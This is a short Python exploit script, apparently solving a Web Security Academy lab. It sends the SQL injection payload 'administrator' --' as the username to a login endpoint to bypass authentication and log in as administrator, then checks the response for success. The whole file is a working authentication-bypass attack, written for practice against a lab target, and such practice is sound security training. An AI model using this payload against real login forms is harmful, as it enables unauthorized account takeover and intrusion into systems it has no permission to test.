
import requests
import blog
def solve(url,path="login"):
    print("attack {url}/{path}")
    """Attempt to log in as administrator using SQL Injection"""
    login_url = f"{url}/{path}"
    data = {
        "username": "administrator' --",
        "password": "anyPassword"
    }
    try:
        response = requests.post(login_url, data=data, timeout=5)
        if "Your username is: administrator" in response.text:
            return "[+] Successfully logged in as administrator!"
        else:
            return "[-] Admin login failed."
    except Exception as e:
        return f"Error: {str(e)}"
if __name__=="__main__":
    url=blog.set("https://0aa900a4033fa08c8021f40a00f100b4.web-security-academy.net/",1)
    print(solve(url))  